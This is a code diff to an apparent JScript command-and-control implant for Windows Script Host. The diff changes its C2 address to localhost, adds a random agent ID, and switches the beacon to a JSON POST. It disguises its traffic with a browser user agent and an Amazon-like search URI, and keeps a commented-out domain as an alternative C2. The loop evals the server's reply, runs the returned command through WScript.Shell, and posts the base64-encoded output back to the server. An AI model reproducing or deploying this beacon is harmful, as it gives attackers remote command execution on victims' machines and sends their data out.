@@ -3,7 +3,7 @@
 //#######################
 var curcmd = "";
 var serverMsg = "";
-var c2url = "http://10.0.0.134";
+var c2url = "http://127.0.0.1";
 var objShell = new ActiveXObject("WScript.Shell");
 var beaconTime = 3000;
 var useragent = "Mozilla/5.0 (compatible, MSIE 11, Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko";
@@ -11,6 +11,9 @@ var uri = "/s/ref=nb_sb_noss_1/167-3294888-0262949/field-keywords=books";
 var xFrameOptions = "SAMEORIGIN";
 var contentEncoding = "gzip";
 var contentType = "text/xml";
+var agentid = Math.floor(Math.random() * 99999999).toString();
+agentid = "24464333";
+WScript.Echo(agentid);
 //var c2url = "http://ssppayments.com/c2.html";
 
 var target = c2url + uri;
@@ -110,17 +113,23 @@ function streamStringToBinary(data) {
 //#######################
 while(true)
 {
-  var serverMsg = webRequest(target);
+  var b = '{"type":"b","agentid": ' + agentid +'}';
+  var serverMsg = webPost(target, b);
+  var jsondata = "{" + serverMsg.split("{")[1]
+
+
    //Check for binject
    //if not then go direct
-
+   //WScript.Echo(curcmd)
+   //WScript.Echo(jsondata)
   //execution
   try
   {
-    if (curcmd != serverMsg) {
+    if (curcmd != jsondata) {
       //Dangerous eval on unsanitized data here
       var retval = "";
-      eval("jsObject="+serverMsg);
+
+      eval("jsObject="+jsondata);
       var execStatus = objShell.Exec(jsObject.cmd);
 
       if (execStatus.status == 2) {
@@ -129,8 +138,10 @@ while(true)
          retval = execStatus.StdOut.ReadAll();
       }
 
-      var resp = '{"agentid":"1","taskid":"1","cmd":"' + jsObject.cmd + '","retval":"' + base64Encode(retval) + '"}';
-      curcmd = serverMsg;
+      var resp = '{"type":"r","agentid": ' + agentid + ',"taskid":"1","cmd":"' + jsObject.cmd + '","retval":"' + base64Encode(retval) + '"}';
+
+      curcmd = jsondata;
+      WScript.Echo(resp);
       webPost(target, resp);
     }
   }
